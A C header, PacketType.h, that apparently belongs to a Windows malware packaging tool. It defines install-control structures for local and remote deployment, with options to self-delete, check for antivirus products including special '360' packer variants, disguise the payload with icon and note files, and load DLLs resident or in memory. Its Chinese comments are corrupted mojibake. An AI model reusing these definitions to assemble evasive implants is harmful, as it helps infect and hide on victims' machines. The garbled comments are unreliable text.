/****************************************************************
 * Module:
 *      PacketType.h
 *
 * Author:
 *		xieb(157360050@qq.com)
 *
 * Note:
 *		�����Ҫ��װ���ļ�ʱʹ�õ�һЩ���ݽṹ������
 *
 * Example:
 *      ����ʱ�ĵ���ʾ��
    
	HMODULE hMod = LoadLibrary(L"..\\Support\\Plat1Gui.dll");
	LPPACKETINIT lpfnPacketInit ;
	LPPLAT1SHOWGUI lpfnPlat1ShowGui;
	PACKET_FUNCTION_POINTER packetFunc;
	PLAT_FILE_TYPE platFileType;

	if ( hMod )
	{
		lpfnPacketInit = (LPPACKETINIT)GetProcAddress(hMod, PLAT1_GUI_FUNC1);
		lpfnPlat1ShowGui = (LPPLAT1SHOWGUI)GetProcAddress(hMod, PLAT1_GUI_FUNC2);
		if ( lpfnPacketInit && lpfnPlat1ShowGui )
		{
			lpfnPacketInit(&packetFunc);

			platFileType.b64Bit = FALSE;
			platFileType.dwFileType = PLAT_FILE_TYPE_3;
			platFileType.productMark.dwProductID = TJ_E6000_ID;
			platFileType.productMark.dwPluginNumber = 0;
			platFileType.productMark.dwInternalVersion = 1;
			lstrcpyW(platFileType.wzLocalFileName, L"E:\\SVN\\Plat1\\Debug\\abc.dll_");
			lstrcpyW(platFileType.wzTargetFileName, L"Test.dat");

			packetFunc.lpAddFile(&platFileType);

			lpfnPlat1ShowGui(NULL, TJ_T5000_ID);
		}
		FreeLibrary(hMod);
	}
 *
 *
 */
#ifndef _PACKET_TYPE_H_
#define _PACKET_TYPE_H_

#include "AdkPrecomp.h"

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// ������صĲ���

// �ֳ���װʱ���԰�װ�������Ϊ����
//
typedef struct _INST_CTL_A {

	BOOL      bShowSuccess;                      // �ڰ�װ�ɹ����Ƿ񵯳���ʾ��Ϣ
	BOOL      bDelSelf;                          // �Ի�
	BOOL      bOnlineNow;
	DWORD     dwNoSupportAntiVirus;              // ��֧�ֵ�ɱ�����
	DWORD     dwSupportAntiVirus;                // ֧�ֵ�ɱ�����
	WCHAR     wzIconFile[MAX_PATH];              // ͼ���ļ�
	WCHAR     wzNoteFile[MAX_PATH];              // ��ʾ��Ϣ�ļ�
	BOOL	  bIsBit32;							 // Ŀ��ϵͳ�Ƿ���32λ

}  INST_CTL_A, *LPINST_CTL_A;

// Զ�̰�װʱ���԰�װ�������Ϊ����
//
typedef struct _INST_CTL_N {

	WCHAR     wzNoteFile[MAX_PATH];              // ��װ���αװ��ʾ��Ϣ
	WCHAR     wzIconFile[MAX_PATH];              // ͼ���ļ�
	BOOL      bDelSelf;                          // �Ի�
	BOOL      bOnlineNow;
	DWORD     dwNoSupportAntiVirus;              // ��֧�ֵ�ɱ�����
	DWORD     dwSupportAntiVirus;                // ֧�ֵ�ɱ�����
	BOOL	  bIsBit32;							 // Ŀ��ϵͳ�Ƿ���32λ

}  INST_CTL_N, *LPINST_CTL_N;

// ���ʱ�õ����ļ����Ͷ���
//
#define PLAT_FILE_TYPE_0        0                // �����⺬��
#define PLAT_FILE_TYPE_1        1                // פ��DLL
#define PLAT_FILE_TYPE_2        2                // פ��EXE
#define PLAT_FILE_TYPE_3        3                // ���ڴ���ط�ʽ���أ�����פ��ģ�����
#define PLAT_FILE_TYPE_4        4                // �ڴ淽ʽ���ص�DLL��������Ҫפ��ģ�����
#define PLAT_FILE_TYPE_SIGDLL	5				 // ������ǩ����DLL
#define PLAT_FILE_TYPE_SIGEXE	6				 // ������ǩ����EXE
#define PLAT_FILE_TYPE_7        7                // ����Ȩ��������DLL
#define PLAT_FILE_TYPE_8        8                // ��װ�õ�DLL

// ���ڲ�Ʒ�Ķ���
//
typedef struct _PRODUCT_MARK {

	DWORD   dwProductID;                         // ��ƷID����TJ_*_ID����
	DWORD   dwPluginNumber;                      // ��Ʒ��������ж�������ļ������Զ��幦���ļ����
	DWORD   dwInternalVersion;                   // �ڲ��汾�ţ���������ʶ����������ʱ���а汾�ȶ�

} PRODUCT_MARK, *LPPRODUCT_MARK;

// ��*Packet*.ini�ļ���Ӧ�����ݽṹ
//
typedef struct _PLAT_FILE_TYPE
{
	PRODUCT_MARK productMark;
	DWORD        dwFileType;                     // ��*Packet*.ini�е�FileType��Ӧ��ȡֵΪPLAT_FILE_TYPE_*
	BOOL         b64Bit;                         // ��*Packet*.ini�е�b64Bit��Ӧ
	WCHAR        wzLocalFileName[MAX_PATH];      // ��*Packet*.ini�е�LocalFileName��Ӧ
	WCHAR        wzTargetFileName[MAX_PATH];     // ��*Packet*.ini�е�TargetFileName��Ӧ
	PBYTE		 filemem;//����Ϊ�գ����ò���Ϊ��ʱ���Զ����ļ��ж�ȡ
	DWORD		 dwfilesize;//����Ϊ�գ����ò���Ϊ��ʱ���Զ����ļ��ж�ȡ
}  PLAT_FILE_TYPE, *LPPLAT_FILE_TYPE;

// ����õ�DLL����ԭ��
//
typedef BOOL (WINAPI *LPADDFILE)(LPPLAT_FILE_TYPE lpPlatFileType);    // �����ļ�
typedef BOOL (WINAPI *LPPACKETN)(LPWSTR lpwzOutputPath, LPINST_CTL_N lpInstCtlN);    // ����Զ�̰�װ������������Ŀ¼
typedef BOOL (WINAPI *LPPACKETN360)(LPWSTR lpwzOutputPath, LPINST_CTL_N lpInstCtlN); // Զ��360
typedef BOOL (WINAPI *LPPACKETA)(LPWSTR lpwzOutputPath, LPINST_CTL_A lpInstCtlA);    // �����ֳ�����ʱ�����
typedef BOOL (WINAPI *LPPACKETA360)(LPWSTR lpwzOutputPath, LPINST_CTL_A lpInstCtlA); // �ֳ�360
typedef BOOL (WINAPI *LPCANCEL)();                                    // ȡ��

typedef struct _PACKET_FUNCTION_POINTER {

	LPADDFILE         lpAddFile;
	LPPACKETN         lpPacketN;
	LPPACKETN360      lpPacketN360;
	LPPACKETA         lpPacketA;
	LPPACKETA360      lpPacketA360;
	LPCANCEL          lpCancel;

} PACKET_FUNCTION_POINTER, *LPPACKET_FUNCTION_POINTER;

// ����õ�DLL�����ĺ���ԭ��
//
typedef BOOL (WINAPI *LPPACKETINIT)(LPPACKET_FUNCTION_POINTER lpFunctionPointer);

// ����õ�DLL�ļ���
//
#define PACKET_DLL_A            L"PacketA.dll"    // �ֳ���װʱʹ�õĴ��DLL�ļ���
#define PACKET_DLL_A_360        L"PacketA360.dll" // �ֳ���װʱʹ�õ�֧��360�����Ĵ��DLL�ļ���
#define PACKET_DLL_N            L"PacketN.dll"    // Զ�̰�װʱʹ�õĴ��DLL�ļ���
#define PACKET_DLL_N_360        L"PacketN360.dll" // Զ�̰�װʱʹ�õ�֧��360�����Ĵ��DLL�ļ���

// ����������
//
#define PACKET_A_INIT           "PacketAInit"
#define PACKET_N_INIT           "PacketNInit"

// �����ز��ֽ���
// ------------------------------------------------------------------------------------------------

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// �����ɽ�����صĲ���

// ����������
//
#define PLAT1_GUI_FUNC1         "Plat1GuiInit"
#define PLAT1_GUI_FUNC2         "Plat1ShowGui"

// //////////////////////////////////////////////////////////////////
// �����û���������ѡ��ĵ�������ԭ��
//
typedef VOID (WINAPI *LPPLAT1SHOWGUI)(HWND hWnd, DWORD dwProductId);

// �����ɽ�����صĲ��ֽ���
// ------------------------------------------------------------------------------------------------


#endif // !_PACKET_TYPE_H_
